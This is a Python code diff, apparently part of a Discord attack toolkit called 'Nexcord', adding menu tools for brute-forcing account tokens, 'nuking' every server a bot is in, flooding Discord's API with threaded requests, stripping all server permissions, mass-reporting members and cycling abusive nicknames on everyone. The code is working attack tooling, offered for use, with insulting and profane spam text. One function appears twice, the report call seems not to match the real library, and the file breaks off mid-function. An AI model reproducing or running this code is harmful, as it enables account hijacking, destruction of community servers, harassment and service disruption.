+def token_bruteforcer_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Token Bruteforcer - Searches for Discord accounts ]\n" + RESET)
+        
+        amount = int(input(WHITE + "How many tokens to test (1-5000): " + RESET))
+        if amount > 5000:
+            amount = 5000
+            print(RED + "Limited to 5000 tokens maximum" + RESET)
+        
+        print(WHITE + "\nStarting token analysis..." + RESET)
+        time.sleep(1)
+
+        valid_tokens = []
+        checked = 0
+        
+        def generate_token():
+            import random
+            import string
+            first_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=24))
+            second_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+            third_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=27))
+            return f"{first_part}.{second_part}.{third_part}"
+        
+        def check_token(token):
+            nonlocal checked
+            checked += 1
+            
+            headers = {'Authorization': token}
+            
+            try:
+                response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=3)
+                if response.status_code == 200:
+                    user_data = response.json()
+                    return {
+                        'valid': True,
+                        'username': f"{user_data['username']}#{user_data['discriminator']}",
+                        'id': user_data['id']
+                    }
+                else:
+                    return {'valid': False, 'status': response.status_code}
+            except Exception as e:
+                return {'valid': False, 'error': str(e)}
+        
+        
+        start_time = time.time()
+        
+        print(WHITE + "\nLive Results:" + RESET)
+        
+        for i in range(amount):
+            if should_exit:
+                break
+                
+            token = generate_token()
+            current_token_display = token[:20] + "..." 
+            
+            print(WHITE + f"Testing: {current_token_display}" + RESET, end="")
+            
+            result = check_token(token)
+            
+            if result['valid']:
+                print(RED + f" -> VALID! User: {result['username']}" + RESET)
+                valid_tokens.append((token, result))
+            else:
+                status_info = ""
+                if 'status' in result:
+                    status_info = f" | Status: {result['status']}"
+                elif 'error' in result:
+                    status_info = f" | Error: {result['error']}"
+                print(WHITE + f" -> INVALID{status_info}" + RESET)
+            
+            
+            if checked % 10 == 0:
+                elapsed = time.time() - start_time
+                tokens_per_second = checked / elapsed if elapsed > 0 else 0
+                print(WHITE + f"Progress: {checked}/{amount} | Valid: {len(valid_tokens)} | Speed: {tokens_per_second:.1f}/s" + RESET)
+        
+        
+        end_time = time.time()
+        total_time = end_time - start_time
+        
+        print(WHITE + "\nDone!" + RESET)
+        print(WHITE + f"Time: {total_time:.2f} seconds" + RESET)
+        print(WHITE + f"Tokens checked: {checked}" + RESET)
+        print(WHITE + f"Valid tokens found: {len(valid_tokens)}" + RESET)
+        print(WHITE + f"Speed: {checked/total_time:.1f} tokens/second" + RESET)
+        
+        if valid_tokens:
+            print(WHITE + "\nValid tokens:" + RESET)
+            for i, (token, info) in enumerate(valid_tokens, 1):
+                print(WHITE + f"{i}. {info['username']} (ID: {info['id']})" + RESET)
+                print(WHITE + f"   {token}" + RESET)
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def bot_network_nuker_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Bot Network Nuker - Nukes all servers with those tokens ]\n" + RESET)
+        
+        tokens_input = input(WHITE + "Enter bot tokens (separated by spaces or commas): " + RESET).strip()
+        if not tokens_input:
+            print(RED + "No tokens provided!" + RESET)
+            return_to_menu()
+            return
+            
+        
+        tokens = []
+        for token in tokens_input.replace(',', ' ').split():
+            if token.strip():
+                tokens.append(token.strip())
+        
+        print(WHITE + f"Loaded {len(tokens)} bot token/s" + RESET)
+        
+        confirm = input(WHITE + "WARNING: This will NUKE ALL servers these bots are in! Type 'CONFIRM' to confirm: " + RESET).strip()
+        if confirm.upper() != "CONFIRM":
+            print(RED + "Operation cancelled." + RESET)
+            return_to_menu()
+            return
+
+        async def nuke_guild(bot, guild):
+            """Nuke a single server"""
+            try:
+                print(WHITE + f"Starting nuke on: {guild.name} ({guild.id})" + RESET)
+                
+                
+                try:
+                    await guild.edit(name="DADDY NEXCORD")
+                    print(WHITE + f"Renamed server: {guild.name}" + RESET)
+                except:
+                    print(RED + f"Failed to rename server: {guild.name}" + RESET)
+                
+                
+                print(WHITE + f"Deleting channels in: {guild.name}" + RESET)
+                for channel in guild.channels:
+                    if should_exit:
+                        return
+                    try:
+                        await channel.delete()
+                        print(WHITE + f"Deleted channel: {channel.name}" + RESET)
+                    except:
+                        continue
+                
+                
+                print(WHITE + f"Deleting roles in: {guild.name}" + RESET)
+                for role in guild.roles:
+                    if should_exit:
+                        return
+                    try:
+                        if role.name != "@everyone" and role < guild.me.top_role and not role.managed:
+                            await role.delete()
+                            print(WHITE + f"Deleted role: {role.name}" + RESET)
+                    except:
+                        continue
+                
+                
+                try:
+                    admin_role = await guild.create_role(
+                        name="Nexcord daddy",
+                        permissions=discord.Permissions(administrator=True),
+                        colour=discord.Colour.red()
+                    )
+                    await admin_role.edit(position=guild.me.top_role.position - 1)
+                    print(WHITE + f"Created admin role in: {guild.name}" + RESET)
+                except:
+                    print(RED + f"Failed to create admin role in: {guild.name}" + RESET)
+                
+                
+                print(WHITE + f"Creating spam channels in: {guild.name}" + RESET)
+                for i in range(20):
+                    if should_exit:
+                        return
+                    try:
+                        channel = await guild.create_text_channel(f"nexcord-{i+1}")
+                        await channel.send("@everyone nuked by daddy nexcord")
+                        print(WHITE + f"Created spam channel: {channel.name}" + RESET)
+                    except:
+                        continue
+                
+                print(WHITE + f" Successfully nuked: {guild.name}" + RESET)
+                
+            except Exception as e:
+                print(RED + f" Failed to nuke {guild.name}: {e}" + RESET)
+
+        async def run_nuker_for_token(token):
+            """Run nuker for a single bot token"""
+            intents = discord.Intents.default()
+            intents.guilds = True
+            intents.members = True
+            bot = commands.Bot(command_prefix="!", intents=intents)
+            
+            try:
+                @bot.event
+                async def on_ready():
+                    print(WHITE + f"\nBot {bot.user} is online! Servers: {len(bot.guilds)}" + RESET)
+                    
+                    
+                    for guild in bot.guilds:
+                        if should_exit:
+                            break
+                        await nuke_guild(bot, guild)
+                    
+                    
+                    await bot.close()
+                
+                await bot.start(token)
+                
+            except Exception as e:
+                print(RED + f"Error with token {token[:20]}...: {e}" + RESET)
+
+        
+        print(WHITE + "\nStarting MASS SERVER NUKE..." + RESET)
+        
+        async def main():
+            tasks = []
+            for token in tokens:
+                if should_exit:
+                    break
+                task = asyncio.create_task(run_nuker_for_token(token))
+                tasks.append(task)
+            
+            
+            if tasks:
+                await asyncio.gather(*tasks, return_exceptions=True)
+        
+        
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(main())
+        
+        print(WHITE + "\nBot Network Nuke completed!" + RESET)
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def nickname_chaos_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Nickname Chaos - Gives random nicknames every 0.5s (@everyone) ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+
+        
+        chaos_names = [
+            "Nexcord Daddy",
+            "I like fucking", 
+            "Get Fucked",
+            "Nexcord Owns You",
+            "Fuck You",
+            "Little Bitch",
+            "Cry More",
+            "Nexcord Slave",
+            "Owned By Nexcord",
+            "Get Rekt Kid",
+            "Fatherless Behavior",
+            "Skill Issue",
+            "Mad Cuz Bad",
+            "Cope Harder",
+            "Seethe More",
+            "L Bozo",
+            "Ratioed",
+            "Touch Grass",
+            "No Life",
+            "Get Good"
+        ]
+
+        confirm = input(WHITE + "Type 'CHAOS' to start nickname chaos: " + RESET).strip()
+        if confirm.upper() != "CHAOS":
+            print(RED + "Operation cancelled." + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Server not found!" + RESET)
+                    await bot.close()
+                    return
+
+                print(WHITE + f"Starting nickname chaos on {guild.name}..." + RESET)
+                print(WHITE + f"Members to chaos: {len(guild.members)}" + RESET)
+                print(RED + "Press Ctrl+C to stop\n" + RESET)
+
+                chaos_count = 0
+                
+                while not should_exit:
+                    for member in guild.members:
+                        if should_exit:
+                            break
+                        if not member.bot and member != guild.me:
+                            try:
+                                
+                                new_nick = random.choice(chaos_names)
+                                await member.edit(nick=new_nick)
+                                chaos_count += 1
+                                print(WHITE + f"Changed {member.name} to: {new_nick}" + RESET)
+                            except:
+                                
+                                continue
+                    
+                    
+                    if not should_exit:
+                        await asyncio.sleep(0.5)
+                        print(WHITE + f"Chaos cycle completed - Total changes: {chaos_count}" + RESET)
+                
+                if should_exit:
+                    print(RED + "Nickname chaos stopped by user!" + RESET)
+                else:
+                    print(WHITE + f"Final chaos count: {chaos_count} nickname changes!" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def discord_api_crasher_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Discord API Crasher - Fucks the discord api ]" + RESET)
+        print(RED + "THIS IS HIGHLY IP BANNABLE AND YES IT FUCKING WORKS!" + RESET)
+        
+        
+        print(WHITE + "\n" + RESET)
+        print(WHITE + "1) Specific Server ID" + RESET)
+        print(WHITE + "2) Random API Endpoints" + RESET)
+        
+        target_choice = input(WHITE + "Select target (1-2): " + RESET).strip()
+        
+        tokens_input = input(WHITE + "Enter bot tokens (separated by spaces): " + RESET).strip()
+        if not tokens_input:
+            print(RED + "No tokens provided!" + RESET)
+            return_to_menu()
+            return
+            
+        tokens = []
+        for token in tokens_input.replace(',', ' ').split():
+            if token.strip():
+                tokens.append(token.strip())
+        
+        threads = int(input(WHITE + "Threads per token (1-100): " + RESET) or "10")
+        duration = int(input(WHITE + "Duration in seconds: " + RESET) or "30")
+        
+        target_id = None
+        if target_choice == "1":
+            target_id = input(WHITE + "Enter target Server ID: " + RESET).strip()
+        
+        confirm = input(WHITE + f"Type 'CRASH' to start API stress test: " + RESET).strip()
+        if confirm.upper() != "CRASH":
+            print(RED + "Operation cancelled." + RESET)
+            return_to_menu()
+            return
+
+        print(WHITE + f"\nStarting API Stress Test with {len(tokens)} tokens..." + RESET)
+        time.sleep(2)
+
+        total_requests = 0
+        successful_requests = 0
+        failed_requests = 0
+        start_time = time.time()
+        
+        
+        api_endpoints = [
+            '/api/v9/guilds/{guild_id}',
+            '/api/v9/guilds/{guild_id}/channels',
+            '/api/v9/guilds/{guild_id}/members',
+            '/api/v9/guilds/{guild_id}/roles',
+            '/api/v9/channels/{channel_id}/messages',
+            '/api/v9/users/@me',
+            '/api/v9/users/@me/guilds',
+            '/api/v9/auth/login',
+            '/api/v9/gateway'
+        ]
+        
+        def generate_random_snowflake():
+            import random
+            return str(random.randint(100000000000000000, 999999999999999999))
+        
+        def send_api_request(token, endpoint):
+            nonlocal total_requests, successful_requests, failed_requests
+            
+            headers = {
+                'Authorization': f'Bot {token}' if token.startswith('MT') else token,
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Content-Type': 'application/json'
+            }
+            
+            url = f"https://discord.com{endpoint}"
+            
+            
+            if '{guild_id}' in endpoint:
+                if target_id:
+                    url = url.replace('{guild_id}', target_id)
+                else:
+                    url = url.replace('{guild_id}', generate_random_snowflake())
+            elif '{channel_id}' in endpoint:
+                url = url.replace('{channel_id}', generate_random_snowflake())
+            
+            try:
+                
+                method = random.choice(['GET', 'POST', 'PUT'])
+                
+                if method == 'GET':
+                    response = requests.get(url, headers=headers, timeout=2)
+                elif method == 'POST':
+                    response = requests.post(url, headers=headers, json={"content": "API STRESS TEST"}, timeout=2)
+                else:
+                    response = requests.put(url, headers=headers, timeout=2)
+                
+                total_requests += 1
+                
+                if response.status_code in [200, 201, 204]:
+                    successful_requests += 1
+                    return True
+                elif response.status_code == 429:
+                    failed_requests += 1
+                    return False
+                else:
+                    failed_requests += 1
+                    return False
+                    
+            except requests.exceptions.RequestException:
+                failed_requests += 1
+                return False
+        
+        def attack_worker(token_id):
+            token = tokens[token_id % len(tokens)]
+            while not should_exit and (time.time() - start_time) < duration:
+                endpoint = random.choice(api_endpoints)
+                send_api_request(token, endpoint)
+                
+                
+                elapsed = time.time() - start_time
+                if total_requests % 100 == 0:
+                    req_per_sec = total_requests / elapsed if elapsed > 0 else 0
+                    print(WHITE + f"Requests: {total_requests} | Success: {successful_requests} | Failed: {failed_requests} | Speed: {req_per_sec:.1f}/s" + RESET)
+        
+        
+        import threading
+        thread_pool = []
+        total_threads = len(tokens) * threads
+        
+        for i in range(total_threads):
+            if should_exit:
+                break
+            t = threading.Thread(target=attack_worker, args=(i,))
+            t.daemon = True
+            t.start()
+            thread_pool.append(t)
+        
+        print(WHITE + f"\nAttack running with {total_threads} threads..." + RESET)
+        print(WHITE + "Press Ctrl+C to stop\n" + RESET)
+        
+        
+        while not should_exit and (time.time() - start_time) < duration:
+            time.sleep(0.1)
+        
+        
+        end_time = time.time()
+        total_duration = end_time - start_time
+        
+        print(WHITE + "\n" + "="*50 + RESET)
+        print(WHITE + "API STRESS TEST COMPLETED" + RESET)
+        print(WHITE + "="*50 + RESET)
+        print(WHITE + f"Duration: {total_duration:.2f}s" + RESET)
+        print(WHITE + f"Total Requests: {total_requests}" + RESET)
+        print(WHITE + f"Successful: {successful_requests}" + RESET)
+        print(WHITE + f"Failed: {failed_requests}" + RESET)
+        print(WHITE + f"Requests/Second: {total_requests/total_duration:.1f}" + RESET)
+        print(WHITE + f"Success Rate: {(successful_requests/total_requests*100) if total_requests > 0 else 0:.1f}%" + RESET)
+        
+        if failed_requests > successful_requests:
+            print(RED + "API might be experiencing stress!" + RESET)
+        else:
+            print(WHITE + "API handled the load well" + RESET)
+        
+    except KeyboardInterrupt:
+        print(RED + "\nAttack stopped by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def nickname_chaos_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Nickname Chaos - Spaz random Nicknames (@everyone) ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+
+        chaos_names = [
+            "Nexcord Daddy",
+            "I like fucking", 
+            "Get Fucked",
+            "Nexcord Owns You",
+            "Fuck You",
+            "Little Bitch",
+            "Cry More",
+            "Nexcord Slave",
+            "Owned By Nexcord",
+            "Get Rekt Kid",
+            "Fatherless Behavior",
+            "Skill Issue",
+            "Mad Cuz Bad",
+            "Cope Harder",
+            "Seethe More",
+            "L Bozo",
+            "Ratioed",
+            "Touch Grass",
+            "No Life",
+            "Get Good"
+        ]
+
+        confirm = input(WHITE + "Type 'CHAOS' to start nickname chaos: " + RESET).strip()
+        if confirm.upper() != "CHAOS":
+            print(RED + "Operation cancelled." + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Server not found!" + RESET)
+                    await bot.close()
+                    return
+
+                print(WHITE + f"Starting nickname chaos on {guild.name}..." + RESET)
+                print(WHITE + f"Members to chaos: {len(guild.members)}" + RESET)
+                print(RED + "Press Ctrl+C to stop\n" + RESET)
+
+                chaos_count = 0
+                
+                while not should_exit:
+                    for member in guild.members:
+                        if should_exit:
+                            break
+                        if not member.bot and member != guild.me:
+                            try:
+                                
+                                new_nick = random.choice(chaos_names)
+                                await member.edit(nick=new_nick)
+                                chaos_count += 1
+                                print(WHITE + f"Changed {member.name} to: {new_nick}" + RESET)
+                            except:
+                                
+                                continue
+                    
+                    
+                    if not should_exit:
+                        await asyncio.sleep(0.5)
+                        print(WHITE + f"Chaos cycle completed - Total changes: {chaos_count}" + RESET)
+                
+                if should_exit:
+                    print(RED + "Nickname chaos stopped by user!" + RESET)
+                else:
+                    print(WHITE + f"Final chaos count: {chaos_count} nickname changes!" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def account_lookup_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Account Lookup - Server Member Info ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        user_input = input(WHITE + "Enter User ID or Username: " + RESET).strip()
+        if not user_input:
+            print(RED + "No user provided!" + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.members = True
+        intents.presences = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Server not found!" + RESET)
+                    await bot.close()
+                    return
+
+                member = None
+                
+                
+                if user_input.isdigit():
+                    user_id = int(user_input)
+                    member = guild.get_member(user_id)
+                else:
+                    for guild_member in guild.members:
+                        if f"{guild_member.name}#{guild_member.discriminator}".lower() == user_input.lower():
+                            member = guild_member
+                            break
+                        elif guild_member.name.lower() == user_input.lower():
+                            member = guild_member
+                            break
+                        elif guild_member.nick and guild_member.nick.lower() == user_input.lower():
+                            member = guild_member
+                            break
+                
+                if not member:
+                    print(RED + "User not found on this server!" + RESET)
+                    await bot.close()
+                    return
+                
+                print(WHITE + "\n" + "="*50 + RESET)
+                print(WHITE + "SERVER MEMBER INFORMATION" + RESET)
+                print(WHITE + "="*50 + RESET)
+                
+                
+                print(WHITE + f"Username: {member.name}#{member.discriminator}" + RESET)
+                print(WHITE + f"User ID: {member.id}" + RESET)
+                
+                try:
+                    print(WHITE + f"Created: {member.created_at.strftime('%Y-%m-%d %H:%M:%S')}" + RESET)
+                except:
+                    print(RED + "Created: Could not get creation date" + RESET)
+                
+                print(WHITE + f"Bot: {member.bot}" + RESET)
+                
+                
+                if member.nick:
+                    print(WHITE + f"Nickname: {member.nick}" + RESET)
+                else:
+                    print(WHITE + "Nickname: None" + RESET)
+                
+                
+                try:
+                    if member.joined_at:
+                        print(WHITE + f"Joined Server: {member.joined_at.strftime('%Y-%m-%d %H:%M:%S')}" + RESET)
+                    else:
+                        print(WHITE + "Joined Server: Unknown" + RESET)
+                except:
+                    print(RED + "Joined Server: Could not get join date" + RESET)
+                
+                
+                try:
+                    if member.roles:
+                        role_names = [role.name for role in member.roles if role.name != "@everyone"]
+                        if role_names:
+                            print(WHITE + f"Roles: {', '.join(role_names)}" + RESET)
+                        else:
+                            print(WHITE + "Roles: None" + RESET)
+                    else:
+                        print(WHITE + "Roles: None" + RESET)
+                except:
+                    print(RED + "Roles: Could not get roles" + RESET)
+                
+                
+                try:
+                    print(WHITE + f"Status: {member.status}" + RESET)
+                except:
+                    print(RED + "Status: Could not get status" + RESET)
+                
+                
+                try:
+                    if member.activity:
+                        activity_type = str(member.activity.type).split('.')[-1].title()
+                        print(WHITE + f"Activity: {activity_type} - {member.activity.name}" + RESET)
+                    else:
+                        print(WHITE + "Activity: None" + RESET)
+                except:
+                    print(RED + "Activity: Could not get activity" + RESET)
+                
+                
+                try:
+                    if member.premium_since:
+                        print(WHITE + f"Boosting: Yes" + RESET)
+                    else:
+                        print(WHITE + "Boosting: No" + RESET)
+                except:
+                    print(RED + "Boosting: Could not get boost info" + RESET)
+                
+                
+                try:
+                    if member.voice:
+                        print(WHITE + f"Voice Channel: {member.voice.channel.name}" + RESET)
+                    else:
+                        print(WHITE + "Voice Channel: Not in voice" + RESET)
+                except:
+                    print(RED + "Voice Channel: Could not get voice info" + RESET)
+                
+                
+                try:
+                    if member.public_flags:
+                        flags = []
+                        if member.public_flags.staff: flags.append("Discord Staff")
+                        if member.public_flags.partner: flags.append("Partner")
+                        if member.public_flags.hypesquad: flags.append("HypeSquad")
+                        if member.public_flags.bug_hunter: flags.append("Bug Hunter")
+                        if member.public_flags.bug_hunter_level_2: flags.append("Bug Hunter Level 2")
+                        if member.public_flags.hypesquad_bravery: flags.append("HypeSquad Bravery")
+                        if member.public_flags.hypesquad_brilliance: flags.append("HypeSquad Brilliance")
+                        if member.public_flags.hypesquad_balance: flags.append("HypeSquad Balance")
+                        if member.public_flags.early_supporter: flags.append("Early Supporter")
+                        if member.public_flags.verified_bot_developer: flags.append("Verified Bot Developer")
+                        if member.public_flags.active_developer: flags.append("Active Developer")
+                        
+                        if flags:
+                            print(WHITE + f"Badges: {', '.join(flags)}" + RESET)
+                        else:
+                            print(WHITE + "Badges: None" + RESET)
+                    else:
+                        print(WHITE + "Badges: None" + RESET)
+                except:
+                    print(RED + "Badges: Could not get badges" + RESET)
+                
+                print(WHITE + "\n" + "="*50 + RESET)
+                print(WHITE + "Lookup completed!" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def remove_perms_all_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Remove Perms All - removes most perms for everybody ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+
+        confirm = input(WHITE + "Type 'CONFIRM' to destroy all permissions: " + RESET).strip()
+        if confirm.upper() != "CONFIRM":
+            print(RED + "Operation cancelled." + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Server not found!" + RESET)
+                    await bot.close()
+                    return
+
+                print(WHITE + f"Starting permission removal on {guild.name}..." + RESET)
+
+                success_count = 0
+                fail_count = 0
+
+                
+                print(WHITE + "Removing role permissions..." + RESET)
+                role_tasks = []
+                for role in guild.roles:
+                    if should_exit:
+                        break
+                    if role.name != "@everyone":
+                        try:
+                            
+                            task = role.edit(permissions=discord.Permissions.none())
+                            role_tasks.append(task)
+                            print(WHITE + f"Removing permissions from role: {role.name}" + RESET)
+                        except Exception as e:
+                            print(RED + f"Failed to remove permissions from {role.name}: {e}" + RESET)
+                            fail_count += 1
+
+                
+                if role_tasks:
+                    results = await asyncio.gather(*role_tasks, return_exceptions=True)
+                    for result in results:
+                        if isinstance(result, Exception):
+                            fail_count += 1
+                        else:
+                            success_count += 1
+
+                
+                print(WHITE + "\nRemoving channel permissions..." + RESET)
+                channel_tasks = []
+                
+                for channel in guild.channels:
+                    if should_exit:
+                        break
+                    try:
+                        
+                        overwrites = {
+                            guild.default_role: discord.PermissionOverwrite(
+                                read_messages=False,
+                                send_messages=False,
+                                read_message_history=False,
+                                add_reactions=False,
+                                connect=False,
+                                speak=False,
+                                view_channel=False
+                            )
+                        }
+                        
+                        task = channel.edit(overwrites=overwrites)
+                        channel_tasks.append(task)
+                        print(WHITE + f"Removing permissions from channel: {channel.name}" + RESET)
+                    except Exception as e:
+                        print(RED + f"Failed to remove permissions from {channel.name}: {e}" + RESET)
+                        fail_count += 1
+
+                
+                if channel_tasks:
+                    results = await asyncio.gather(*channel_tasks, return_exceptions=True)
+                    for result in results:
+                        if isinstance(result, Exception):
+                            fail_count += 1
+                        else:
+                            success_count += 1
+
+                
+                print(WHITE + "\nRemoving category permissions..." + RESET)
+                category_tasks = []
+                
+                for category in guild.categories:
+                    if should_exit:
+                        break
+                    try:
+                        overwrites = {
+                            guild.default_role: discord.PermissionOverwrite(
+                                read_messages=False,
+                                send_messages=False,
+                                read_message_history=False,
+                                add_reactions=False,
+                                connect=False,
+                                speak=False,
+                                view_channel=False
+                            )
+                        }
+                        
+                        task = category.edit(overwrites=overwrites)
+                        category_tasks.append(task)
+                        print(WHITE + f"Removing permissions from category: {category.name}" + RESET)
+                    except Exception as e:
+                        print(RED + f"Failed to remove permissions from {category.name}: {e}" + RESET)
+                        fail_count += 1
+
+                
+                if category_tasks:
+                    results = await asyncio.gather(*category_tasks, return_exceptions=True)
+                    for result in results:
+                        if isinstance(result, Exception):
+                            fail_count += 1
+                        else:
+                            success_count += 1
+
+                
+                print(WHITE + "\n" + "="*50 + RESET)
+                print(WHITE + "PERMISSION REMOVAL COMPLETED" + RESET)
+                print(WHITE + "="*50 + RESET)
+                print(WHITE + f"Successful operations: {success_count}" + RESET)
+                print(RED + f"Failed operations: {fail_count}" + RESET)
+                print(WHITE + f"Total channels/roles processed: {success_count + fail_count}" + RESET)
+                
+                if fail_count == 0:
+                    print(WHITE + "ALL PERMISSIONS SUCCESSFULLY REMOVED!" + RESET)
+                    print(WHITE + "Server is now completely locked down!" + RESET)
+                else:
+                    print(RED + "Some permissions may still remain" + RESET)
+                
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def report_all_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Report All - Mass Report Safe ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        
+        
+        exclude_input = input(WHITE + "Enter user IDs to exclude (separated by space or comma): " + RESET).strip()
+        exclude_ids = []
+        if exclude_input:
+            for uid in exclude_input.replace(',', ' ').split():
+                if uid.strip().isdigit():
+                    exclude_ids.append(int(uid.strip()))
+        
+        report_reason = input(WHITE + "Enter report reason: " + RESET).strip() or "Spam and harassment"
+
+        confirm = input(WHITE + "Type 'REPORT ALL' to mass report everyone: " + RESET).strip()
+        if confirm.upper() != "REPORT ALL":
+            print(RED + "Operation cancelled." + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Server not found!" + RESET)
+                    await bot.close()
+                    return
+
+                print(WHITE + f"Starting mass report on {guild.name}..." + RESET)
+                print(WHITE + f"Excluding {len(exclude_ids)} users from reports\n" + RESET)
+
+                reported_count = 0
+                failed_count = 0
+                excluded_count = 0
+
+                
+                tasks = []
+                for member in guild.members:
+                    if should_exit:
+                        break
+                    
+                    
+                    if member.id in exclude_ids or member.bot or member == guild.me:
+                        excluded_count += 1
+                        continue
+                    
+                    try:
+                        
+                        task = member.report(reason=report_reason)
+                        tasks.append((member, task))
+                        print(WHITE + f"Queued report for: {member.name}#{member.discriminator}" + RESET)
+                    except Exception as e:
+                        print(RED + f"Failed to queue report for {member.name}: {e}" + RESET)
+                        failed_count += 1
+
+                
+                if tasks:
+                    print(WHITE + f"\nExecuting {len(tasks)} reports simultaneously..." + RESET)
+                    
+                    
+                    report_tasks = [task for _, task in tasks]
+                    results = await asyncio.gather(*report_tasks, return_exceptions=True)
+                    
+                    
+                    for i, result in enumerate(results):
+                        member = tasks[i][0]
+                        if isinstance(result, Exception):
+                            print(RED + f"Failed to report {member.name}: {result}" + RESET)
+                            failed_count += 1
+                        else:
+                            print(WHITE + f"Successfully reported: {member.name}#{member.discriminator}" + RESET)
+                            reported_count += 1
+
+                
+                print(WHITE + "\n" + "="*50 + RESET)
